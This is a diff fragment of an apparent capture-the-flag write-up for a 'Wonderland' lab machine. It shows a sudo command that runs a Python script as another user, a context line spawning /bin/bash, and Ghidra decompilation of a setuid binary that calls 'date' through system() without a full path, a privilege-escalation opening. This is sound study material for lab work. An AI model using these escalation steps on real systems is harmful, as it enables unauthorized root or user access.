@@ -175,3 +175,28 @@ os.system('/bin/bash')
 ```
 sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 ```
+
+in ghidra
+```
+void main(void)
+
+{
+  setuid(0x3eb);
+  setgid(0x3eb);
+  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
+  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
+  puts("Ask very nicely, and I will give you some tea while you wait for him");
+  getchar();
+  puts("Segmentation fault (core dumped)");
+  return;
+}
+
+```
+
+```
+rabbit@wonderland:/home/rabbit$ id -u hatter
+1003
+
+```
+
+and `0x3eb` == `1003`. 
